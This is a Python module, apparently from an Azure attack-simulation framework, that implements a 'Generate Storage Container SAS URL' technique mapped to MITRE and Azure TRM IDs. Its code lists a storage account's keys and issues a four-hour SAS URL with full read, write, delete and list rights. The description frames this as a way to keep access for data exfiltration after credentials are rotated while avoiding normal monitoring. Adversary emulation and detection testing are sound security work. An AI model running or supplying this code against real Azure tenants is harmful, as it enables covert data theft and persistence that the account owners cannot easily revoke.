from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from azure.storage.blob import BlobServiceClient, generate_container_sas, ContainerSasPermissions
from azure.mgmt.storage import StorageManagementClient
from core.azure.azure_access import AzureAccess
from datetime import datetime, timedelta, timezone

@TechniqueRegistry.register
class AzureGenerateStorageContainerSAS(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1530",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            ),
            MitreTechnique(
                technique_id="T1552.005", 
                technique_name="Unsecured Credentials",
                tactics=["Credential Access"],
                sub_technique_name="Cloud Instance Metadata API"
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT701.2",
                technique_name="SAS URI Generation",
                tactics=["Impact"],
                sub_technique_name="Storage Account File Share SAS"
            )
        ]
        super().__init__("Generate Storage Container SAS URL", "Generates container-level Shared Access Signature (SAS) tokens that provide authenticated access to Azure Storage containers without requiring storage account keys or Azure AD credentials. This technique creates SAS URIs with full read, write, delete, and list permissions, valid for 4 hours, which can be used to access container data from anywhere without leaving typical authentication logs. SAS tokens are particularly dangerous as they can't be easily revoked before expiration, persist even if other credentials are rotated, and their usage is harder to track compared to standard authentication methods. Generate SAS tokens as a persistence mechanism to maintain access for data exfiltration, even if the original compromise is detected and account credentials or storage keys are rotated. The technique can be used to create portable access tokens that can be utilized outside the Azure environment with standard storage tools and SDKs, making data exfiltration harder to detect through normal Azure monitoring.", mitre_techniques, azure_trm_technique)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            rg_name: str = kwargs["rg_name"]
            account_name: str = kwargs["account_name"]
            container_name: str = kwargs["container_name"]

            # Get credential
            credential = AzureAccess.get_azure_auth_credential()
            # Retrieve subscription id
            current_sub_info = AzureAccess().get_current_subscription_info()
            subscription_id = current_sub_info.get("id")
            
            # create client
            storage_client = StorageManagementClient(credential, subscription_id)
            
            # Obtain keys
            storage_account_keys = storage_client.storage_accounts.list_keys(rg_name, account_name)
            storage_account_key = storage_account_keys.keys[0].value

            BlobServiceClient(account_url=f"https://{account_name}.blob.core.windows.net", credential={"account_name": account_name, "account_key": storage_account_key})

            # Generate SAS token for the container
            sas_token = generate_container_sas(
                account_name=account_name,
                container_name=container_name,
                account_key=storage_account_key,
                permission=ContainerSasPermissions(read=True, write=True, delete=True, list=True),
                expiry=datetime.now(timezone.utc) + timedelta(hours=4)  # Set expiry time to 4 hours
            )
            
            sas_url = f"https://{account_name}.blob.core.windows.net/{container_name}?{sas_token}"

            return ExecutionStatus.SUCCESS, {
                "message": f"Successfully generated SAS for storage account container",
                "value": {
                    "sas_url" : sas_url,
                    "resource_group" : rg_name,
                    "account" : account_name,
                    "container" : container_name
                }
            }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to generate SAS for storage account container"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "account_name": {"type": "str", "required": True, "default": None, "name": "Account Name", "input_field_type" : "text"},
            "rg_name": {"type": "str", "required": True, "default": None, "name": "Resource Group Name", "input_field_type" : "text"},
            "container_name": {"type": "str", "required": True, "default": None, "name": "Container Name", "input_field_type" : "text"}
        }